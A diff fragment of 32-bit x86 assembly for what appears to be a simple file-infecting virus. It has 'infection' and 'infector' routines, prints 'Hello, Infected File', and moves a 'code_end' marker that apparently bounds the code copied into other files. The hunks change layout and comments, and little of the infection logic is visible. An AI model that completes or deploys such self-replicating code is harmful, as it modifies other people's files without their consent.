@@ -6,14 +6,19 @@ extern main
 global infection
 global infector
 
-
 section .data
 message db "Hello, Infected File", 10  ; Message to print with newline character
 message_len equ $ - message              ; Calculate the length of the message
 
+section .bss
+dummy resb 1024  ; Dummy variable to reserve space in BSS section
+
+section .text
+
 _start:
     pop    dword ecx    ; ecx = argc
     mov    esi,esp      ; esi = argv
+
     ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
     mov     eax,ecx     ; put the number of arguments into eax
     shl     eax,2       ; compute the size of argv in bytes
@@ -58,10 +63,8 @@ infection:
     mov     edx, message_len ; Length of the message
     int     0x80            ; Invoke system call
     ret
-code_end:
 
 infector:
-    ; Function prologue
     push    ebp
     mov     ebp, esp
 
@@ -91,7 +94,6 @@ infector:
     mov     eax, 6          ; SYS_CLOSE system call number
     int     0x80            ; Invoke system call
 
-    ; Function epilogue
     pop     ebp
     ret
 
@@ -101,3 +103,5 @@ infector:
     mov     eax, 1          ; SYS_EXIT system call number
     mov     ebx, 0          ; Clear ebx (return code 0)
     int     0x80            ; Invoke system call
+
+code_end:
